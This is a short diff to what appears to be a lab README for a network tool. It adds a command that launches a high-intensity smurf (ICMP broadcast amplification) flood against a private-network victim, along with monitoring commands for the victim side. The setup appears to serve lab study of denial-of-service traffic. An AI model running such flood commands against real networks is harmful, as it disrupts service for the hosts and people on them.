@@ -23,10 +23,17 @@ In attacker
 ```sh 
 python ping_tool.py responder --smurf --target 172.28.0.20
 ```
+```sh 
+python3 ping_tool.py --smurf --high-intensity --target 172.28.0.20 --duration 60 --target-mbps 75 172.28.255.255
+```
 
 In victim
 ```sh 
 tcpdump -n icmp
+```
+For test the load on the network card during an intensity smurf-attack
+```sh
+iftop -i eth0
 ```
 
 ### Setting parameters
